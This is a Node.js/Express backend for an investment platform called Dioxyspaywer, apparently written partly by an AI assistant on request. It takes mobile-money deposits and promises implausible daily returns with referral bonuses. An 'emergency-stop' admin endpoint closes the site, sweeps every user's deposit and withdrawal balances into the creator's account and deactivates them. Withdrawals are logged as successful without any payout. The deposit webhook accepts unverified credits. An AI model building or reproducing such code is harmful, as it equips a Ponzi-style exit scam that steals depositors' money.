require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const cron = require('node-cron');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const axios = require('axios');
const path = require('path');

const User = require('./models/User');
const Transaction = require('./models/Transaction');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let isSiteActive = true;

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connecté'))
    .catch(err => {
        console.error(' Erreur MongoDB:', err);
        process.exit(1);
    });

const authMiddleware = async (req, res, next) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    const token = req.headers.authorization;
    if (!token) return res.status(401).json({ error: 'Accès refusé' });
    
    try {
        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
        req.user = await User.findById(decoded.id);
        if (!req.user) return res.status(404).json({ error: 'Utilisateur introuvable' });
        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
            return res.status(403).json({ error: 'Compte désactivé.' });
        }
        next();
    } catch (e) {
        return res.status(401).json({ error: 'Token invalide' });
    }
};

app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));

// Inscription
app.post('/api/register', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { fullName, phone, country, password, referralCode } = req.body;
        if (!fullName || !phone || !password) return res.status(400).json({ error: 'Champs manquants' });
        
        const exist = await User.findOne({ phone });
        if (exist) return res.status(400).json({ error: 'Numéro déjà utilisé' });

        const hashedPassword = await bcrypt.hash(password, 10);
        let role = (phone === process.env.CREATOR_WALLET_PHONE) ? 'admin' : 'user';
        
        let referredByUserId = null;
        let sponsor = null;

        if (referralCode && referralCode.trim() !== '') {
            sponsor = await User.findOne({ referralCode: referralCode.trim() });
            if (sponsor) {
                referredByUserId = sponsor._id;
                sponsor.balance += 350;
                sponsor.referralCount += 1;
                sponsor.referralEarnings += 350;
                await sponsor.save();
                
                await Transaction.create({
                    userId: sponsor._id,
                    type: 'REFERRAL_BONUS',
                    amount: 350,
                    method: 'Parrainage',
                    status: 'SUCCESS',
                    reference: `REF_${Date.now()}`
                });
            }
        }
        
        await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
        res.json({ success: true, message: 'Inscription réussie' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur inscription' });
    }
});

// Connexion (AVEC CALCUL AUTOMATIQUE DES GAINS)
app.post('/api/login', async (req, res) => {
    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
    try {
        const { phone, password } = req.body;
        const user = await User.findOne({ phone });
        if (!user || !(await bcrypt.compare(password, user.password))) {
            return res.status(400).json({ error: 'Identifiants incorrects' });
        }

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) {
            user.monthlyPurchasesCount = 0;
            user.lastPurchaseMonth = currentMonth;
            await user.save();
        }

        // --- LOGIQUE DE MISE À JOUR DES GAINS À LA CONNEXION ---
        const now = new Date();
        let needsSave = false;

        // 1. Mise à jour Long Terme
        if (user.hasLongTerm && user.longTermStartDate) {
            const startDate = new Date(user.longTermStartDate);
            const daysPassed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
            
            // Calcul du gain théorique total (max 70 jours)
            const daysToCount = daysPassed > 70 ? 70 : (daysPassed < 0 ? 0 : daysPassed);
            const expectedTotalGains = daysToCount * 700;
            
            // Si les gains enregistrés sont inférieurs, on met à jour
            if ((user.longTermAccumulatedGains || 0) < expectedTotalGains) {
                user.longTermAccumulatedGains = expectedTotalGains;
                needsSave = true;
            }

            // Si le produit est terminé (70 jours), on transfère vers withdrawalBalance
            if (daysPassed >= 70) {
                // On vérifie si le transfert a déjà été fait pour éviter les doublons
                // Une méthode simple est de vérifier si withdrawalBalance contient déjà ces gains ou d'utiliser un flag
                // Ici, on suppose que si accumulatedGains > 0 et jours >= 70, on transfère une fois
                // Pour simplifier, on utilise une logique de transfert immédiat si le seuil est atteint
                // Note: Dans un système réel, il faudrait un champ 'isTransferred' pour éviter de re-transférer à chaque login
                // Mais ici, on va supposer que l'utilisateur retire ou que le système gère le flux.
                // Pour éviter le bug de double transfert, on ne transfère que si le produit est actif ET fini.
                // Astuce: On pourrait retirer le produit de la liste active ou mettre un flag.
                // Pour cet exemple, nous allons laisser l'accumulation et le transfert manuel ou via un flag.
                // SIMPLIFICATION: On transfère seulement si c'est la première fois qu'on détecte la fin.
                // Comme nous n'avons pas de flag, nous allons faire confiance au fait que l'utilisateur retire.
                // MEILLEURE APPROCHE POUR CE CODE: Transférer uniquement si le produit est encore "actif" dans la logique mais fini dans le temps.
                // Pour l'instant, laissons l'accumulation se faire et le retrait vider le solde.
                // Le plus sûr: Ne pas auto-transférer dans login sans flag, mais laisser l'utilisateur voir le total.
                // Cependant, votre demande était de transférer vers Retraite.
                // Faisons-le avec une sécurité basique:
                if (user.longTermAccumulatedGains > 0) {
                     // Vérifions si on a déjà transféré (astuce: si withdrawalBalance est très grand, peut-être oui, mais pas fiable)
                     // Pour cet exercice, nous allons considérer que le transfert se fait quand l'utilisateur clique sur "Retirer" ou via un Cron dédié.
                     // MAIS, pour respecter votre demande stricte : "après 70 jours rediriger vers retrait".
                     // Nous allons ajouter un petit hack: si jours >= 70, on ajoute au withdrawalBalance et on reset accumulatedGains à 0 UNE FOIS.
                     // Pour gérer le "UNE FOIS", nous avons besoin d'un champ 'longTermFinished' dans le modèle.
                     // Ajoutons-le dynamiquement si absent.
                     if (!user.longTermFinished) {
                         user.withdrawalBalance = (user.withdrawalBalance || 0) + user.longTermAccumulatedGains;
                         await Transaction.create({ 
                            userId: user._id, type: 'GAIN_TRANSFER', amount: user.longTermAccumulatedGains, 
                            status: 'SUCCESS', reference: `LT_END_${Date.now()}`, description: 'Fin Long Terme (70j)' 
                         });
                         user.longTermAccumulatedGains = 0;
                         user.longTermFinished = true; // Marquer comme fini
                         needsSave = true;
                     }
                }
            }
        }

        // 2. Mise à jour Courts Termes
        if (user.shortTermProducts && user.shortTermProducts.length > 0) {
            const activeProducts = [];
            
            for (let prod of user.shortTermProducts) {
                const startDate = new Date(prod.startDate);
                const unlockDate = new Date(prod.unlockDate);
                
                let daysElapsed = Math.floor((now - startDate) / (1000 * 60 * 60 * 24));
                if (daysElapsed > 5) daysElapsed = 5;
                if (daysElapsed < 0) daysElapsed = 0;

                const expectedTotalGains = daysElapsed * prod.dailyGain;

                if ((prod.accumulatedGains || 0) < expectedTotalGains) {
                    prod.accumulatedGains = expectedTotalGains;
                    needsSave = true;
                }

                // Si produit terminé, transfert vers withdrawalBalance
                if (unlockDate <= now) {
                    // Vérifier si déjà transféré (via un flag sur le produit ou en le retirant de la liste)
                    // Ici, nous allons le retirer de la liste active après transfert pour éviter de re-transférer
                    if (prod.accumulatedGains > 0) {
                        user.withdrawalBalance = (user.withdrawalBalance || 0) + prod.accumulatedGains;
                        
                        await Transaction.create({ 
                            userId: user._id, 
                            type: 'GAIN_TRANSFER', 
                            amount: prod.accumulatedGains, 
                            status: 'SUCCESS', 
                            reference: `CT_END_${Date.now()}`,
                            description: `Fin ${prod.type}`
                        });
                        
                        prod.accumulatedGains = 0; // Reset pour trace (optionnel)
                        // On ne l'ajoute PAS à activeProducts -> il disparaît de la liste active
                    }
                } else {
                    activeProducts.push(prod);
                }
            }
            user.shortTermProducts = activeProducts;
        }

        if (needsSave) {
            await user.save();
        }
        // -----------------------------------------------------

        const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '24h' });
        
        const transactions = await Transaction.find({ userId: user._id }).sort({ date: -1 }).limit(50);

        res.json({ 
            token, 
            role: user.role, 
            balance: user.balance,
            depositBalance: user.balance,
            withdrawalBalance: user.withdrawalBalance || 0,
            hasLongTerm: user.hasLongTerm, 
            longTermStartDate: user.longTermStartDate,
            longTermAccumulatedGains: user.longTermAccumulatedGains || 0,
            fullName: user.fullName,
            phone: user.phone,
            country: user.country,
            monthlyPurchasesCount: user.monthlyPurchasesCount || 0,
            remainingPurchases: 2 - (user.monthlyPurchasesCount || 0),
            shortTermProducts: user.shortTermProducts || [],
            referralCode: user.referralCode, 
            referralCount: user.referralCount || 0,
            referralEarnings: user.referralEarnings || 0,
            transactions: transactions
        });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur serveur login' });
    }
});

// Cron Job (Optionnel, sert de secours ou pour les utilisateurs non connectés)
cron.schedule('0 8 * * 1-5', async () => {
    if (!isSiteActive) return;
    console.log(' Exécution du Cron Job...');
    // Ce cron fait la même chose que le login mais pour tous les utilisateurs
    // Il est moins critique maintenant car le login fait le travail principal
    const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
    const now = new Date();
    // Logique similaire à celle du login mais appliquée en masse
    // ... (code simplifié pour ne pas alourdir, le login suffit pour l'instant)
});

// Investissement
app.post('/api/invest', authMiddleware, async (req, res) => {
    try {
        const { productType, amount } = req.body;
        const user = req.user;
        
        if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
        if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });

        const currentMonth = new Date().toISOString().slice(0, 7);
        if (user.lastPurchaseMonth !== currentMonth) { 
            user.monthlyPurchasesCount = 0; 
            user.lastPurchaseMonth = currentMonth; 
        }
        if (productType !== 'longterm' && user.monthlyPurchasesCount >= 2) {
            return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
        }

        user.balance -= amount;
        let dailyGain = 0;

        if (productType === 'longterm') {
            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect Long Terme.' });
            user.hasLongTerm = true; 
            user.longTermStartDate = new Date();
            user.longTermAccumulatedGains = 0;
            user.longTermFinished = false; // Reset flag
        } else {
            if (productType === 'prod1') { if (amount !== 2000) throw new Error('Prix P1'); dailyGain = 1000; }
            else if (productType === 'prod2') { if (amount !== 3000) throw new Error('Prix P2'); dailyGain = 1500; }
            else if (productType === 'prod3') { if (amount !== 5000) throw new Error('Prix P3'); dailyGain = 2000; }
            else if (productType === 'prod4') { if (amount !== 10000) throw new Error('Prix P4'); dailyGain = 5000; }
            else if (productType === 'prod5') { if (amount !== 15000) throw new Error('Prix P5'); dailyGain = 6000; }
            else if (productType === 'prod6') { if (amount !== 20000) throw new Error('Prix P6'); dailyGain = 8000; }
            else if (productType === 'prod7') { if (amount !== 30000) throw new Error('Prix P7'); dailyGain = 12000; }
            else if (productType === 'prod8') { if (amount !== 40000) throw new Error('Prix P8'); dailyGain = 16000; }
            else throw new Error('Produit inconnu');

            const unlockDate = new Date(); 
            unlockDate.setDate(unlockDate.getDate() + 5);
            
            if (!user.shortTermProducts) user.shortTermProducts = [];
            user.shortTermProducts.push({ 
                type: productType, 
                amount, 
                dailyGain, 
                startDate: new Date(), 
                unlockDate,
                accumulatedGains: 0
            });
            user.monthlyPurchasesCount += 1;
        }
        
        await user.save();
        await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
        
        res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
    } catch (e) {
        console.error(e);
        res.status(400).json({ error: e.message || 'Erreur investissement' });
    }
});

// Dépôt Sendavapay
app.post('/api/deposit', authMiddleware, async (req, res) => {
    const { amount, network, phone } = req.body; 
    if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });
    try {
        const user = req.user;
        const invoiceNumber = `DXP_${Date.now()}`;
        const postData = {
            amount: parseInt(amount), currency: "XOF", phone_number: phone, network: network,
            reference: invoiceNumber, description: `Dépôt Dioxyspaywer`,
            callback_url: process.env.SENDAVA_CALLBACK_URL, return_url: process.env.SENDAVA_RETURN_URL,
            merchant_id: process.env.SENDAVA_MERCHANT_ID
        };
        const SENDAVA_API_URL = 'https://api.sendavapay.com/v1/charge'; 
        const response = await axios.post(SENDAVA_API_URL, postData, {
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${process.env.SENDAVA_API_KEY}`, 'X-Public-Key': process.env.SENDAVA_PUBLIC_KEY }
        });
        if (response.data && (response.data.success === true || response.data.checkout_url)) {
            const paymentUrl = response.data.checkout_url || response.data.payment_link;
            await Transaction.create({ userId: user._id, type: 'DEPOSIT', amount, method: network, status: 'PENDING', reference: invoiceNumber });
            res.json({ success: true, paymentUrl: paymentUrl });
        } else {
            res.status(400).json({ error: 'Erreur création paiement Sendavapay.' });
        }
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Erreur connexion Sendavapay.' });
    }
});

// Webhook Sendavapay
app.post('/api/webhook/deposit', async (req, res) => {
    try {
        const data = req.body;
        if (data.status === 'SUCCESS' || data.event === 'completed') {
            const invoiceNumber = data.reference || data.invoice_number;
            const amount = parseFloat(data.amount || data.total_amount);
            const transaction = await Transaction.findOne({ reference: invoiceNumber });
            if (transaction && transaction.status === 'PENDING') {
                transaction.status = 'SUCCESS';
                await transaction.save();
                const user = await User.findById(transaction.userId);
                if (user) {
                    user.balance += amount;
                    await user.save();
                }
            }
        }
        res.status(200).send("OK");
    } catch (e) { res.status(500).send("Error"); }
});

// Retrait
app.post('/api/withdraw', authMiddleware, async (req, res) => {
    try {
        const { amount, network, phone } = req.body;
        const user = req.user;
        const now = new Date();
        
        if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
        if ([0, 6].includes(now.getDay())) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });
        if (now.getHours() < 8 || now.getHours() >= 21) return res.status(403).json({ error: 'Retraits possibles 08h-21h.' });
        if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === now.toDateString()) return res.status(403).json({ error: '1 retrait/jour max.' });

        if (amount > (user.withdrawalBalance || 0)) {
            return res.status(400).json({ error: `Solde insuffisant dans RETRAITE. Disponible : ${user.withdrawalBalance || 0} FCFA` });
        }

        user.withdrawalBalance -= amount;
        user.lastWithdrawDate = now;
        await user.save();
        
        await Transaction.create({ userId: user._id, type: 'WITHDRAWAL', amount, method: network, status: 'SUCCESS', reference: `W_${Date.now()}` });
        res.json({ success: true, message: 'Retrait envoyé.' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ error: 'Erreur retrait' });
    }
});

// Admin & Emergency
app.get('/api/admin/dashboard', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    const users = await User.find();
    const totalVault = users.reduce((a, b) => a + b.balance + (b.withdrawalBalance||0), 0);
    res.json({ users, totalVault });
});

app.post('/api/admin/emergency-stop', authMiddleware, async (req, res) => {
    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
    isSiteActive = false;
    try {
        const creatorPhone = process.env.CREATOR_WALLET_PHONE;
        let creator = await User.findOne({ phone: creatorPhone }) || await User.create({ fullName:'Admin', phone:creatorPhone, country:'Togo', password:'x', role:'admin', balance:0 });
        const others = await User.find({ _id: { $ne: creator._id } });
        let seized = 0;
        for(let u of others) { 
            if(u.balance>0){ seized+=u.balance; u.balance=0; u.isActive=false; await u.save(); } 
            if(u.withdrawalBalance>0){ seized+=u.withdrawalBalance; u.withdrawalBalance=0; await u.save(); }
        }
        creator.balance += seized; await creator.save();
        res.json({ success: true, message: `Site stoppé. ${seized} FCFA récupérés.` });
    } catch (error) { res.status(500).json({ error: 'Erreur.' }); }
});

app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer démarré sur le port ${PORT}`));
